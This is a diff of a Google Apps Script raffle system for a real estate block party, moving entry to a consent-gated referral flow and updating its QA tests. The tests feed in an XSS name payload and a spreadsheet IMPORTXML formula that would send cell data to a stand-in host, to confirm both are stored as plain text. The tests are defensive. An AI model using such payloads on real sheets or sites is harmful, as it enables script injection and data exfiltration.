@@ -24,9 +24,31 @@
 // ---------- Event configuration ----------
 var RAFFLE_EVENT_NAME   = 'TSG Block Party 2026';
 var RAFFLE_TZ           = 'America/New_York';
-// Entries open when the party opens and close at the draw. Both are enforced
-// server-side, so a saved/shared link can't be used to enter days later.
-var RAFFLE_OPEN_AT      = '2026-09-19T15:00:00-04:00';
+// 2026-09-17, per Durand: the entry window is OPEN FROM NOW, not just during the
+// party. The original design only accepted entries between 3:00 and 6:15 on the
+// day, which made sense when entering was a 20-second sign-in at a table. It
+// stopped making sense when entry became "refer someone, and your entry counts
+// once THEY confirm": that puts a third party's inbox on the critical path, and
+// a three-hour Saturday window is not enough time for most people to open an
+// email and respond. A window that tight would have produced a 6:30 announcement
+// with a near-empty pool.
+//
+// Opening it early is also what makes the pre-event email to invited clients
+// work -- people arrive already entered, and referrals have days rather than
+// hours to confirm.
+//
+// The CLOSE is still hard and still server-side: entries stop at 6:15 because
+// that is when the winner is drawn. Anything else would mean drawing from a pool
+// that is still changing.
+var RAFFLE_OPEN_AT      = '2026-09-01T00:00:00-04:00';
+// The party itself. Until 2026-09-17 every date on the page was derived from
+// RAFFLE_OPEN_AT, which was fine while "entries open" and "the party starts"
+// were the same instant. They are not any more, so the event has its own
+// constant and the page reads the event date from here. Change the party date in
+// ONE place and every line on the form follows.
+var RAFFLE_EVENT_AT     = '2026-09-19T15:00:00-04:00';
+var RAFFLE_EVENT_ENDS   = '7:00 PM';
+var RAFFLE_VENUE        = '1342 N Hancock St, Philadelphia';
 var RAFFLE_CLOSE_AT     = '2026-09-19T18:15:00-04:00';
 var RAFFLE_DRAW_AT      = '2026-09-19T18:15:00-04:00';
 var RAFFLE_ANNOUNCE_AT  = '6:30 PM';
@@ -76,6 +98,13 @@ var RAFFLE_TAGS   = ['Block Party 2026', 'Block Party Raffle Entrant', 'Event Le
 var RAFFLE_CODE_TTL_SECONDS = 900;      // 15 minutes to type a 6-digit code
 var RAFFLE_CODE_MAX_ATTEMPTS = 5;
 var RAFFLE_PENDING_PREFIX = 'raffle_pending_';
+// A verified session: proof, on later requests, that this visitor owns the email
+// address their entry will be attributed to. Written by raffleVerifyCode_ and
+// read by raffleSubmitReferral_. One hour is long enough to think of someone to
+// refer and type their details, and short enough that a phone left on a table at
+// the party is not a standing credential.
+var RAFFLE_VERIFIED_PREFIX = 'raffle_verified_';
+var RAFFLE_VERIFIED_TTL_SECONDS = 3600;
 
 // ---------- Verification-email abuse caps ----------
 // Step 1 emails a code to whatever address is posted, before anything is
@@ -185,11 +214,67 @@ var RAFFLE_BACKUP_COUNT = 2;
 // about which wording a given entrant actually saw.
 var RAFFLE_CONSENT_VERSION = 'raffle-v2 (2026-09-16, email-verified entry)';
 
+// 2026-09-17, per Durand: entry is now by REFERRAL. A row is written when the
+// entrant submits a referral, but it is not an entry yet -- 'Entry Status' is
+// 'pending-consent' until the referred person clicks the link in their email and
+// consents themselves. Only 'eligible' rows are drawn from.
+//
+// Columns are appended, never reordered or renamed: raffleEnsureHeaders_ widens
+// an existing sheet in place, so the tab Durand already has keeps its rows.
 var RAFFLE_SHEET_HEADERS = [
   'Timestamp (ET)', 'Full Name', 'Email', 'Phone',
   'Consent', 'Consent Version', 'Entry Source',
-  'FUB Status', 'FUB Person ID', 'Eligible', 'Email Verified'
+  'FUB Status', 'FUB Person ID', 'Eligible', 'Email Verified',
+  // --- referral entry (added 2026-09-17) ---
+  'Entry Status',        // pending-consent | eligible | superseded | declined
+  'Referral Name', 'Referral Email', 'Referral Phone',
+  'Referral Role',       // Buyer | Seller
+  'Referral Timeframe',
+  'Referral FUB ID',
+  'Referral Consent At',
+  'Referral Emailed At',
+  'Consent Token'
 ];
+
+// Column indexes, by name, resolved once. Reading by index literal is what makes
+// a schema change dangerous; this makes appending a column a one-line edit.
+var RAFFLE_COL = (function () {
+  var m = {};
+  RAFFLE_SHEET_HEADERS.forEach(function (h, i) { m[h] = i; });
+  return m;
+})();
+
+var RAFFLE_STATUS_PENDING    = 'pending-consent';
+var RAFFLE_STATUS_ELIGIBLE   = 'eligible';
+var RAFFLE_STATUS_SUPERSEDED = 'superseded';
+var RAFFLE_STATUS_DECLINED   = 'declined';
+
+// Widens an existing tab to the current header set, in place. Idempotent, and
+// safe on the tab that already holds live rows: it only ever ADDS columns to the
+// right of what is there, and only when the existing header row is a prefix of
+// the current one. Anything else (a renamed or reordered column) is refused
+// loudly rather than guessed at, because guessing would silently mis-map data.
+function raffleEnsureHeaders_(sh) {
+  var lastCol = sh.getLastColumn();
+  if (lastCol >= RAFFLE_SHEET_HEADERS.length) return;
+  if (lastCol > 0) {
+    var existing = sh.getRange(1, 1, 1, lastCol).getValues()[0]
+      .map(function (v) { return String(v || '').trim(); });
+    for (var i = 0; i < existing.length; i++) {
+      if (existing[i] && existing[i] !== RAFFLE_SHEET_HEADERS[i]) {
+        throw new Error('Raffle sheet "' + sh.getName() + '" column ' + (i + 1) + ' is "' +
+          existing[i] + '" but the code expects "' + RAFFLE_SHEET_HEADERS[i] + '". ' +
+          'Refusing to migrate a sheet whose columns have been reordered or renamed.');
+      }
+    }
+  }
+  var missing = RAFFLE_SHEET_HEADERS.slice(lastCol);
+  sh.getRange(1, lastCol + 1, 1, missing.length).setValues([missing])
+    .setFontWeight('bold');
+  sh.setFrozenRows(1);
+  Logger.log('raffleEnsureHeaders_: added ' + missing.length + ' column(s) to "' +
+    sh.getName() + '": ' + missing.join(', '));
+}
 
 // ---------- Small helpers ----------
 function raffleNow_() { return new Date(); }
@@ -302,7 +387,9 @@ function raffleSheet_(test) {
   if (!id) throw new Error(RAFFLE_SHEET_PROP + ' is not set. Run setupRaffle() once from the editor.');
   var ss = SpreadsheetApp.openById(id);
   if (!test) {
-    return ss.getSheetByName(RAFFLE_LIVE_SHEET_NAME) || ss.getSheets()[0];
+    var live = ss.getSheetByName(RAFFLE_LIVE_SHEET_NAME) || ss.getSheets()[0];
+    raffleEnsureHeaders_(live);
+    return live;
   }
   var sh = ss.getSheetByName(RAFFLE_TEST_SHEET_NAME);
   if (!sh) {
@@ -311,6 +398,7 @@ function raffleSheet_(test) {
     sh.setFrozenRows(1);
     sh.getRange(1, 1, 1, RAFFLE_SHEET_HEADERS.length).setFontWeight('bold').setBackground('#fde2e1');
   }
+  raffleEnsureHeaders_(sh);
   return sh;
 }
 
@@ -466,6 +554,10 @@ function raffleServeForm_(e, baseUrl) {
   var qaTestToken = issueQaTestToken_(e);
   var isTest = !!qaTestToken;
 
+  // The link in the referral's email. No key: the token in ?t= is the credential,
+  // and it only ever unlocks that one person's own record.
+  if (action === RAFFLE_CONSENT_ACTION) return raffleConsentPage_(e);
+
   if (action === 'status' || action === 'draw') {
     var key = PropertiesService.getScriptProperties().getProperty(RAFFLE_ADMIN_PROP);
     // Constant-ish comparison and an identical response for a wrong key as for
@@ -492,12 +584,18 @@ function raffleServeForm_(e, baseUrl) {
   // dead at 6:15 -- all without a reload. It measures against the SERVER clock,
   // not the visitor's, so a phone with a wrong clock still opens and closes on
   // time. The server re-checks the window on every submit regardless.
-  // Derived from RAFFLE_OPEN_AT, never typed a second time -- change the event
+  // Derived from RAFFLE_EVENT_AT, never typed a second time -- change the event
   // date in one place and every line on the page follows.
-  tmpl.eventDate     = Utilities.formatDate(new Date(RAFFLE_OPEN_AT), RAFFLE_TZ, 'EEEE, MMMM d, yyyy');
-  tmpl.eventDateShort= Utilities.formatDate(new Date(RAFFLE_OPEN_AT), RAFFLE_TZ, 'EEEE, MMMM d');
-  tmpl.openTime      = Utilities.formatDate(new Date(RAFFLE_OPEN_AT), RAFFLE_TZ, 'h:mm a');
+  tmpl.eventDate     = Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'EEEE, MMMM d, yyyy');
+  tmpl.eventDateShort= Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'EEEE, MMMM d');
+  tmpl.openTime      = Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'h:mm a');
   tmpl.openAtMs      = String(new Date(RAFFLE_OPEN_AT).getTime());
+  // The Buyer/Seller timeframe dropdown, fed from FUB live (getFubTimeframes in
+  // Code.gs, cached 30 min) exactly like the Open House form's. safeJsonForScript_
+  // is what makes it safe to drop into a <script> block.
+  var raffleTfList   = raffleTimeframes_();
+  tmpl.timeframeList = safeJsonForScript_(raffleTfList);
+  tmpl.defaultTimeframe = raffleDefaultTimeframe_(raffleTfList) || '';
   tmpl.closeAtMs     = String(new Date(RAFFLE_CLOSE_AT).getTime());
   tmpl.serverNowMs   = String(Date.now());
   return tmpl.evaluate()
@@ -576,7 +674,12 @@ function raffleHandleSubmission_(d) {
   var test = isQaTestMode_();
   try {
     var step = String((d && d.step) || 'request').toLowerCase();
-    if (step === 'verify') return raffleVerifyCode_(d, test);
+    if (step === 'verify')   return raffleVerifyCode_(d, test);
+    if (step === 'referral') return raffleSubmitReferral_(d, test);
+    if (step === 'invite')   return raffleSendReferralInvite_(d, test);
+    // The consent POST comes from the referred person, who has no session and no
+    // test-mode token: which tab their row lives in is what decides test-ness.
+    if (step === 'consent')  return raffleConsentSubmit_(d);
     return raffleRequestCode_(d, test);
   } catch (err) {
     if (err && err.isValidation) return jsonOut({ ok: false, error: err.message });
@@ -736,45 +839,57 @@ function raffleVerifyCode_(d, test) {
     throw makeValidationError('That code is not right. Check your email and try again.');
   }
 
-  // Verified. The entry is written from the CACHED values, never from anything
-  // the client sent with this second request -- otherwise someone could verify
-  // one address and enter a different one.
+  // Verified. Everything below uses the CACHED values, never anything the client
+  // sent with this second request -- otherwise someone could verify one address
+  // and enter under a different one.
   cache.remove(key);
   var name = pending.name, email = pending.email, phone = pending.phone;
   var isTest = !!pending.test;
 
-  var emailKey = raffleEmailKey_(email), phoneKey = rafflePhoneKey_(phone);
-  var lock = LockService.getScriptLock();
-  if (!lock.tryLock(10000)) throw makeValidationError('We are busy for a moment — tap Enter again.');
-  var appended;
-  try {
-    var existing = raffleReadEntries_(isTest);
-    for (var i = 0; i < existing.length; i++) {
-      if ((emailKey && existing[i].emailKey === emailKey) ||
-          (phoneKey && existing[i].phoneKey === phoneKey)) {
-        return jsonOut({ ok: true, already: true,
-          message: 'You are already entered! Winner announced at ' + RAFFLE_ANNOUNCE_AT + '.' });
-      }
-    }
-    appended = raffleAppendEntry_(name, email, phone, isTest);
-  } finally {
-    try { lock.releaseLock(); } catch (releaseErr) { /* non-fatal */ }
-  }
-
+  // 2026-09-17, per Durand: "have the entrant enter all of their info and submit
+  // first, then if the entrant exists match to that fub contact, if not just
+  // create a new one, so the entrant never knows if they were in the database to
+  // begin with or not."
+  //
+  // So there is no lookup step and no "we found your record" screen. The entrant
+  // fills the form in, and the server resolves them against FUB silently:
+  // rafflePushToFub_ already does confident match-and-update (one match updates
+  // that contact additively, none creates, two+ creates and alerts a human), so
+  // an existing client is never duplicated and is never told they were found.
+  // The response below is byte-identical either way.
+  //
+  // This also means a visitor who verifies and then wanders off is still captured
+  // as a lead -- they gave their details and accepted the rules before the code
+  // was ever sent.
   var fub = rafflePushToFub_(name, email, phone, isTest);
-  try { raffleRecordFubOutcome_(appended.row, fub, isTest); }
-  catch (recErr) { Logger.log('raffleRecordFubOutcome_ failed: ' + recErr); }
   if (!fub.ok) {
     try {
-      sendErrorAlert('Raffle: FUB write failed for ' + name,
-        'Entry IS saved in the raffle sheet (row ' + appended.row + ') and is eligible ' +
-        'for the draw. Only the FUB push failed; raffleRetryFubFailures() can re-push it.\n\n' +
-        fub.error);
+      sendErrorAlert('Raffle: entrant FUB write failed for ' + name,
+        'The entrant verified their email but the FUB write failed. They can still ' +
+        'submit a referral -- the raffle row is written to the sheet independently ' +
+        'and raffleRetryFubFailures() can re-push afterwards.\n\n' + fub.error);
     } catch (alertErr) { Logger.log('Raffle FUB alert failed: ' + alertErr); }
   }
 
-  return jsonOut({ ok: true, verified: true,
-    message: 'You are entered! Winner announced at ' + RAFFLE_ANNOUNCE_AT + '.' });
+  // The verified session. This is what proves, on the NEXT request, that whoever
+  // is submitting a referral owns the email address it will be attributed to.
+  // Nothing has been entered into the drawing yet: under the referral rules an
+  // entry does not exist until a referred person consents.
+  var session = {
+    name: name, email: email, phone: phone,
+    personId: (fub && fub.personId) || '',
+    test: isTest, verifiedAt: raffleFmt_(raffleNow_())
+  };
+  cache.put(RAFFLE_VERIFIED_PREFIX + vid, JSON.stringify(session),
+            RAFFLE_VERIFIED_TTL_SECONDS);
+
+  return jsonOut({
+    ok: true,
+    verified: true,
+    vid: vid,
+    firstName: String(name).split(' ')[0],
+    message: 'Thanks ' + String(name).split(' ')[0] + ' — now tell us who you are referring.'
+  });
 }
 
 function raffleAppendEntry_(name, email, phone, test) {
@@ -824,7 +939,20 @@ function raffleReadEntries_(test) {
       phone: unmark(r[3]),
       emailKey: raffleEmailKey_(unmark(r[2])),
       phoneKey: rafflePhoneKey_(unmark(r[3])),
-      fubStatus: String(r[7] || '')
+      fubStatus: String(r[7] || ''),
+      // A row written before the referral change has an empty Entry Status.
+      // Those rows were real entries under the old rules, so they read as
+      // eligible rather than being silently dropped from the draw.
+      status: String(r[RAFFLE_COL['Entry Status']] || RAFFLE_STATUS_ELIGIBLE),
+      referralName:  unmark(r[RAFFLE_COL['Referral Name']]),
+      referralEmail: unmark(r[RAFFLE_COL['Referral Email']]),
+      referralPhone: unmark(r[RAFFLE_COL['Referral Phone']]),
+      referralRole:  unmark(r[RAFFLE_COL['Referral Role']]),
+      referralEmailKey: raffleEmailKey_(unmark(r[RAFFLE_COL['Referral Email']])),
+      referralPhoneKey: rafflePhoneKey_(unmark(r[RAFFLE_COL['Referral Phone']])),
+      referralFubId: unmark(r[RAFFLE_COL['Referral FUB ID']]),
+      referralTimeframe: unmark(r[RAFFLE_COL['Referral Timeframe']]),
+      consentToken: unmark(r[RAFFLE_COL['Consent Token']])
     });
   });
   return out;
@@ -1168,9 +1296,15 @@ function raffleDrawWinner_(test, force) {
     existing = raffleStoredWinner_(test);          // re-read inside the lock
     if (existing) return { ok: true, alreadyDrawn: true, result: existing };
 
-    var entries = raffleReadEntries_(test);
+    // Only rows the referred person actually consented to. A pending-consent
+    // row is not an entry: the entrant was told plainly that their entry counts
+    // only once their referral says yes, and the draw has to mean that.
+    var entries = raffleReadEntries_(test).filter(function (e) {
+      return e.status === RAFFLE_STATUS_ELIGIBLE;
+    });
     if (!entries.length) {
-      return { ok: false, error: 'No eligible entries — nothing to draw.' };
+      return { ok: false, error: 'No eligible entries — nothing to draw. ' +
+        '(Rows still waiting on a referral to consent do not count.)' };
     }
 
     // Fisher-Yates over a copy: the winner is element 0 and the backups follow,
@@ -1402,10 +1536,52 @@ function raffleQaRun_(cleanUp) {
     var raw = CacheService.getScriptCache().get(RAFFLE_PENDING_PREFIX + vid);
     return raw ? JSON.parse(raw).code : null;
   }
-  function enterFully(d) {
+  // Step 1+2 only: details -> emailed code -> verified session. Nothing is
+  // entered; under the referral rules an entry does not exist yet.
+  function verifyFully(d) {
     var r1 = request(d);
     if (!r1.ok || !r1.needsCode) return r1;
     return json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: codeFor(r1.vid) }));
+  }
+
+  // A referral for entrant `n`, distinct per entrant: one entry per referred
+  // PERSON is the rule, so reusing one referral across entrants would (correctly)
+  // be refused and would test the wrong thing.
+  function referralFor(n, phone) {
+    return {
+      referralName: 'QA Referral' + n + ' Blockparty',
+      referralEmail: RAFFLE_QA_ADDRESS_BASE + stamp + '-ref' + n + RAFFLE_QA_DOMAIN,
+      referralPhone: phone,
+      referralRole: (String(n).length % 2 === 0) ? 'Seller' : 'Buyer',
+      referralTimeframe: raffleDefaultTimeframe_(raffleTimeframes_()) || '',
+      consent: 'Yes'
+    };
+  }
+
+  // The whole journey, the way a real pair of people drive it. `opts.skipConsent`
+  // stops at "emailed, waiting on them", which is the state most of the day will
+  // actually be in.
+  function enterFully(d, n, refPhone, opts) {
+    opts = opts || {};
+    var v = verifyFully(d);
+    if (!v.ok || !v.verified) return v;
+    var ref = referralFor(n === undefined ? '1' : n, refPhone || '(215) 555-9101');
+    var staged = json(raffleHandleSubmission_(
+      Object.assign({ step: 'referral', vid: v.vid }, ref)));
+    if (!staged.ok || !staged.staged) return staged;
+    var invited = json(raffleHandleSubmission_(
+      { step: 'invite', vid: v.vid, token: staged.token }));
+    if (opts.skipConsent) { invited.token = staged.token; return invited; }
+    var done = json(raffleHandleSubmission_({
+      step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
+      referralName: ref.referralName, referralEmail: ref.referralEmail,
+      referralPhone: ref.referralPhone, referralRole: ref.referralRole,
+      referralTimeframe: ref.referralTimeframe
+    }));
+    done.token = staged.token;
+    done.vid = v.vid;
+    done.referral = ref;
+    return done;
   }
 
   // ---- 1. Junk rejection -------------------------------------------------
@@ -1441,30 +1617,78 @@ function raffleQaRun_(cleanUp) {
   check('a wrong code is refused', bad.ok === false, JSON.stringify(bad));
   check('a wrong code still wrote nothing', raffleReadEntries_(true).length === 0);
   var good = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: code }));
-  check('the right code enters them', good.ok === true, JSON.stringify(good));
-  check('one entry now on the TEST tab', raffleReadEntries_(true).length === 1);
+  check('the right code verifies them', good.ok === true && good.verified === true, JSON.stringify(good));
+  check('verification hands back a session id', /^[0-9a-fA-F-]{36}$/.test(String(good.vid)));
+  check('verification alone still writes NO entry', raffleReadEntries_(true).length === 0);
+  check('the reply does not reveal whether they were already in FUB',
+        !/found|existing|already a|welcome back/i.test(JSON.stringify(good)), JSON.stringify(good));
   var replay = json(raffleHandleSubmission_({ step: 'verify', vid: r1.vid, code: code }));
   check('the code cannot be replayed', replay.ok === false);
-  check('replay added no second row', raffleReadEntries_(true).length === 1);
+  check('replay still wrote nothing', raffleReadEntries_(true).length === 0);
 
-  // ---- 3. One entry per person -------------------------------------------
-  section('3. One entry per person');
-  var dupEmail = request(Object.assign({}, a, { phone: '(267) 555-8999' }));
-  check('same email is recognised as already entered', dupEmail.already === true, JSON.stringify(dupEmail));
-  var dupPhone = request(Object.assign({}, a, { email: RAFFLE_QA_ADDRESS_BASE + stamp + '-1b' + RAFFLE_QA_DOMAIN }));
-  check('same phone is recognised as already entered', dupPhone.already === true, JSON.stringify(dupPhone));
-  var dupFmt = request(Object.assign({}, a, {
-    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-1c' + RAFFLE_QA_DOMAIN, phone: '+1 215.555.8101' }));
-  check('same phone in a different format is still caught', dupFmt.already === true, JSON.stringify(dupFmt));
-  check('still exactly one entry after 3 duplicate attempts', raffleReadEntries_(true).length === 1);
+  // ---- 3. The referral, and the consent it waits on ----------------------
+  section('3. Referral -> invite -> consent');
+  var refA = referralFor('1', '(215) 555-9101');
+  var staged = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: good.vid }, refA)));
+  check('the referral is staged', staged.ok === true && staged.staged === true, JSON.stringify(staged));
+  check('a row exists now', raffleReadEntries_(true).length === 1);
+  var pendingRows = raffleReadEntries_(true).filter(function (r) {
+    return r.status === RAFFLE_STATUS_PENDING; });
+  check('but it is PENDING, not an entry', pendingRows.length === 1,
+        JSON.stringify(raffleReadEntries_(true).map(function (r) { return r.status; })));
+  var earlyDraw = raffleDrawWinner_(true);
+  check('a pending row cannot be drawn', earlyDraw.ok === false, JSON.stringify(earlyDraw));
+
+  var invited = json(raffleHandleSubmission_(
+    { step: 'invite', vid: good.vid, token: staged.token }));
+  check('the invite sends', invited.ok === true && invited.sent === true, JSON.stringify(invited));
+  var resend = json(raffleHandleSubmission_(
+    { step: 'invite', vid: good.vid, token: staged.token }));
+  check('the invite cannot be sent twice', resend.alreadySent === true, JSON.stringify(resend));
+
+  var consented = json(raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
+    referralName: refA.referralName, referralEmail: refA.referralEmail,
+    referralPhone: refA.referralPhone, referralRole: refA.referralRole,
+    referralTimeframe: refA.referralTimeframe }));
+  check('the referral can consent', consented.ok === true && consented.confirmed === true,
+        JSON.stringify(consented));
+  var eligibleRows = raffleReadEntries_(true).filter(function (r) {
+    return r.status === RAFFLE_STATUS_ELIGIBLE; });
+  check('and only NOW is it an entry', eligibleRows.length === 1);
+  var reConsent = json(raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
+    referralName: refA.referralName, referralEmail: refA.referralEmail,
+    referralPhone: refA.referralPhone, referralRole: refA.referralRole,
+    referralTimeframe: refA.referralTimeframe }));
+  check('consenting twice changes nothing', reConsent.already === true, JSON.stringify(reConsent));
+  check('still exactly one row', raffleReadEntries_(true).length === 1);
+
+  // ---- 3b. One entry per REFERRED PERSON ---------------------------------
+  section('3b. One entry per referred person');
+  var b = person('9', '(215) 555-8199');
+  var vB = verifyFully(b);
+  check('a second entrant verifies fine', vB.ok === true && vB.verified === true, JSON.stringify(vB));
+  var stolen = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, refA)));
+  check('they cannot refer someone already referred', stolen.ok === false, JSON.stringify(stolen));
+  check('and the refusal does not say which check failed',
+        !/already a contact|in our database|existing contact/i.test(String(stolen.error)),
+        String(stolen.error));
+  check('no extra row was written', raffleReadEntries_(true).length === 1);
+  var self = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, referralFor('9', '(215) 555-8199'), {
+    referralEmail: b.email, referralPhone: b.phone })));
+  check('and they cannot refer themselves', self.ok === false, JSON.stringify(self));
 
   // ---- 4. More entrants + counts -----------------------------------------
   section('4. Additional entrants and counts');
-  [['2','(215) 555-8102'], ['3','(215) 555-8103'], ['4','(267) 555-8104']].forEach(function (p) {
-    var res = enterFully(person(p[0], p[1]));
+  [['2','(215) 555-8102','(215) 555-9102'],
+   ['3','(215) 555-8103','(215) 555-9103'],
+   ['4','(267) 555-8104','(215) 555-9104']].forEach(function (p) {
+    var res = enterFully(person(p[0], p[1]), p[0], p[2]);
     check('entrant ' + p[0] + ' accepted', res.ok === true && !res.already, JSON.stringify(res));
   });
-  var n = raffleReadEntries_(true).length;
+  var n = raffleReadEntries_(true).filter(function (r) {
+    return r.status === RAFFLE_STATUS_ELIGIBLE; }).length;
   check('four entrants on the test tab', n === 4, 'got ' + n);
   var statusOut = raffleStatusPage_(true);
   var statusHtml = String(typeof statusOut.getContent === 'function' ? statusOut.getContent() : statusOut);
@@ -1499,7 +1723,7 @@ function raffleQaRun_(cleanUp) {
   var xssName = '<img src=x onerror=alert(1)> QA Tester ' + stamp;
   var xssRes = enterFully({ fullName: xssName,
     email: RAFFLE_QA_ADDRESS_BASE + stamp + '-xss' + RAFFLE_QA_DOMAIN,
-    phone: '(215) 555-8105', consent: 'Yes' });
+    phone: '(215) 555-8105', consent: 'Yes' }, 'xss', '(215) 555-9105');
   check('an entry with markup in the name is accepted (it is only text)', xssRes.ok === true,
         JSON.stringify(xssRes));
   var sOut = raffleStatusPage_(true);
@@ -1511,7 +1735,7 @@ function raffleQaRun_(cleanUp) {
   var formulaName = '=IMPORTXML("https://example.invalid/?d="&C2,"//a") QA ' + stamp;
   var fRes = enterFully({ fullName: formulaName,
     email: RAFFLE_QA_ADDRESS_BASE + stamp + '-csv' + RAFFLE_QA_DOMAIN,
-    phone: '(215) 555-8106', consent: 'Yes' });
+    phone: '(215) 555-8106', consent: 'Yes' }, 'csv', '(215) 555-9106');
   check('an entry with a formula in the name is accepted (it is only text)', fRes.ok === true,
         JSON.stringify(fRes));
   var fSheet = raffleSheet_(true);
